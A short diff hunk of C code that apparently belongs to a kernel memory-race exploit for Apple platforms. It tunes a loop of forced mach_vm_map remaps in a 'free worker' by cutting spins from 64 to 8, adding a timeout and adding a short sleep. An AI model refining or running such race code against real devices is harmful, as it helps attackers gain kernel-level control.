@@ -77,7 +77,10 @@ void* cs2_free_worker(void* arg) {
             kr = mach_vm_map(mach_task_self(), &spin_addr, free_target_size, 0, VM_FLAGS_FIXED | VM_FLAGS_OVERWRITE, target_object, target_object_offset, false, VM_PROT_DEFAULT,
                              VM_PROT_DEFAULT, VM_INHERIT_NONE);
             if (kr != KERN_SUCCESS) { break; }
-            if (++spins >= 64) break;
+            if (spins >= 8) break;           /* VM-thrash law: 64/race wedged configd-class */
+            if (cs2_expired()) break;
+            usleep(2);                        /* breathe between remaps */
+            if (++spins >= 8) break;
         }
         while (atomic_load_explicit(&shared->race_sync, memory_order_seq_cst) == 1);
         if (kr != KERN_SUCCESS) {
